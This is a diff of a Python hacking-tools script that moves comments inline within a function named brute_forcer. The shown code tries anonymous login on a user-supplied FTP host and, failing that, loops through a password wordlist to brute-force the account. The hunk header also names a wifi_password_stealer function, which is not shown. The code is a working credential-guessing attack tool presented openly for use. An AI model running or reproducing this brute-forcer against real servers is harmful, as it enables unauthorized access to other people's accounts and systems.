@@ -38,31 +38,21 @@ def wifi_password_stealer():
 
 def brute_forcer():
     host = input("Enter the hostname/ip: ")
-    # username of the FTP server, root as default for linux
-    username = input("Enter the username: ")
-
-    # the file which contains a list of possible password
+    username = input("Enter the username: ")  # username of FTP server, root(default) for linux
     passwordlist = input("Enter the filename/path of the wordlist: ")
 
     def check_anon_login(host):
         try:
-            with FTP(host) as ftp:
-                # trying anonymous credentials
+            with FTP(host) as ftp:  # trying anonymous credentials
                 ftp.login()  # user anonymous, passwd anonymous@
-
-                # return true if the server allows anonymous login
-                return True
+                return True  # return true if the server allows anonymous login
         except Exception as err:
             print(err)
-            # otherwise return false
-            return False
+            return False  # otherwise return false
 
     def ftp_buster(host, username, passwordlist):
-        # open the password-list file and read the passwords
-        with open(passwordlist, "r") as passwd_file:
-            # iterate over passwords one by one
-            # if the password is found, break out of the loop
-            for password in passwd_file.readlines():
+        with open(passwordlist, "r") as passwd_file:  # iterate over passwords one by one
+            for password in passwd_file.readlines():  # if the password is found, break
                 password = password.strip()
                 with FTP(host=host, timeout=0.1) as ftp:
                     try:
@@ -73,11 +63,9 @@ def brute_forcer():
                         print(f"Trying...:{password}", e)
                         continue
 
-    # check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster
-    # function
     if check_anon_login(host=host):
         print("logged In")
-    else:
+    else:  # check if our ftp server accepts anonymous login, if not we try to brute force
         print("Anonymous login failed, Trying to brute force the password")
         ftp_buster(host=host, username=username, passwordlist=passwordlist)
 
